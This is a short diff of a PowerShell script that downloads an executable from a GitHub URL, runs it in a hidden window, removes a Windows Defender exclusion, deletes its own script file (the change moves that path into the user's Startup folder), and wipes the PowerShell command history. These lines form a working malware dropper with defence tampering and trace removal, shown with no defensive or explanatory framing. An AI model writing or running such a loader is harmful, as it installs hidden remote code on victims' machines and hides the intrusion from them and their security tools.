@@ -10,6 +10,6 @@ Invoke-WebRequest https://github.com/p1mpus/script/raw/main/Runtime.exe -o Runti
 Start-Process -WindowStyle hidden Runtime.exe
 Set-ExecutionPolicy Restricted -Force
 Remove-MpPreference -ExclusionExtension ps1 -Force
-Remove-Item C:\Users\Public\Documents\script.ps1
+Remove-Item C:\Users\p1mpu\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\script.ps1
 Clear-Content (Get-PSReadLineOption).HistorySavePath
 exit
